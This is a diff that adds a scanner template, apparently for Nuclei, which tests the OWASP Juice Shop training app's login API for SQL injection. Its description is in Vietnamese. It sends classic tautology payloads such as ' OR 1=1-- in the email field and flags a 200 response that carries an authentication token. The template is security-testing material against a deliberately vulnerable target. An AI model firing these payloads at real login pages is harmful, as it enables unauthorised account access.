@@ -1,0 +1,47 @@
+id: juice-shop-sqli
+
+info:
+  name: Juice Shop Login SQL Injection
+  author: your-name
+  severity: critical
+  description: |
+    SQLi login bypass thông qua API /rest/user/login của Juice Shop.
+  reference: https://owasp.org/www-project-juice-shop/
+  tags: sqli,juice-shop,login
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/rest/user/login"
+
+    headers:
+      Content-Type: application/json
+      Accept: application/json
+
+    payloads:
+      sqli_payload:
+        - "' OR 1=1--"
+        - "\" OR 1=1--"
+        - "' OR '1'='1"
+        - "' OR 'a'='a"
+
+    attack: clusterbomb
+
+    body: |
+      {
+        "email": "{{sqli_payload}}",
+        "password": "anything"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "authentication"
+          - "token"
+        condition: and
+
+      - type: status
+        status:
+          - 200
